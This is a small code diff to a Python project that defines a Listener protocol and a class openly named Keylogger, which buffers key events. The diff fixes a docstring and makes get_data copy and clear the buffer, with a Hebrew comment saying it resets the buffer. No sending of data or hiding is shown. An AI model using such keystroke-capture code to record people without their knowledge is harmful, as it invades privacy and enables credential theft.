@@ -7,7 +7,7 @@ class Listener(Protocol):
     """
     Listener is a protocol that defines the interface for listening to data.
 
-    it will may be implemented by classes that listen to data in different ways.
+    it may be implemented by classes that listen to data in different ways.
     such as:
         Listen to keyboard events
         Listen to mouse events
@@ -28,7 +28,7 @@ class Listener(Protocol):
 
     def get_data(self) -> List[str]:
         """
-        get the data that has been collected.
+        get the data that has been collected and reset the buffer.
         """
         ...
 
@@ -52,9 +52,11 @@ class Keylogger:
 
     def get_data(self) -> List[str]:
         """
-        get the data that has been collected.
+        get the data that has been collected and reset the buffer.
         """
-        return self.buffer
+        data = self.buffer.copy()
+        self.buffer.clear()  # איפוס ה-buffer
+        return data
 
     def _on_key_event(self, event):
         """
